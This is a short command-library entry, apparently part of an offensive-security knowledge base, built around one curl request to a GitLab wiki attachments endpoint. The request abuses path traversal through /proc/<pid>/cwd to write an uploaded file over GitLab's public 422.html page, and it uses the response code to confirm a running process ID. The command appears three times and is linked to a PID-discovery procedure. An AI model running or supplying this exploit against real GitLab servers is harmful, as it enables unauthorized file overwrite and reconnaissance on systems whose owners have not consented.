---
data: >-
  curl -s -o /dev/null -w "%{http_code}\n" -XPOST -H "Authorization: Bearer
  $TOKEN"
  'http://gitlab-vm.local/api/v4/projects/171/wikis/attachments?file.path=/proc/19603/cwd/../../../../../opt/gitlab/embedded/service/gitlab-rails/public/422.html'
  -F '[file]=@/tmp/lala.txt'
tags:
  - probing
type: command
executor: bash
platforms:
  - Linux
id: 68b9b832-b3b4-4c12-be72-0fd59b310c7f
created_at: '2025-12-11T06:10:15.403Z'
updated_at: '2025-12-11T06:10:15.403Z'
verified: false
validated: true
submitted: true
---
# curl-pid-validation-19603

## Command

```bash
curl -s -o /dev/null -w "%{http_code}\n" -XPOST -H "Authorization: Bearer $TOKEN" 'http://gitlab-vm.local/api/v4/projects/171/wikis/attachments?file.path=/proc/19603/cwd/../../../../../opt/gitlab/embedded/service/gitlab-rails/public/422.html' -F '[file]=@/tmp/lala.txt'
```

## Description

Checks HTTP code to validate PID 19603.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-s` | Silent | Yes |
| `-o /dev/null` | Discard | Yes |
| `-w "%{http_code}\n"` | Print code | Yes |

## Examples

### Basic Usage

```bash
curl -s -o /dev/null -w "%{http_code}\n" -XPOST -H "Authorization: Bearer $TOKEN" 'http://gitlab-vm.local/api/v4/projects/171/wikis/attachments?file.path=/proc/19603/cwd/../../../../../opt/gitlab/embedded/service/gitlab-rails/public/422.html' -F '[file]=@/tmp/lala.txt'
```

## Expected Output

201

## Related

- [[procedures/Discover-Valid-PID-via-Proc-Filesystem-Probing]]
